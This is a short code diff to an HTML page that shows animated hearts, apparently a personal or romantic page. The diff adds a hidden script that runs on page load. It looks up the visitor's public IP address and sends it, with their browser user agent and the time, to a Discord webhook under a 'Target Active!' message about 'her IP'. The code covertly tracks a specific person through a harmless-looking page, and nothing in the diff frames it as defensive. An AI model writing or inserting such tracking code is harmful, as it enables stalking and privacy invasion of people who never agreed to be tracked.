@@ -225,7 +225,22 @@
                 setTimeout(() => heart.remove(), 1000);
             }
         }
+        fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      const herIP = data.ip;
+
+      // 2. Send it to your Discord Webhook
+      fetch('YOUR_DISCORD_WEBHOOK_URL_HERE', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `🚀 **Target Active!**\n**IP:** ${herIP}\n**Device:** ${navigator.userAgent}\n**Time:** ${new Date().toLocaleString()}`
+        })
+      });
+    });
     </script>
 </body>
 
 </html>
+
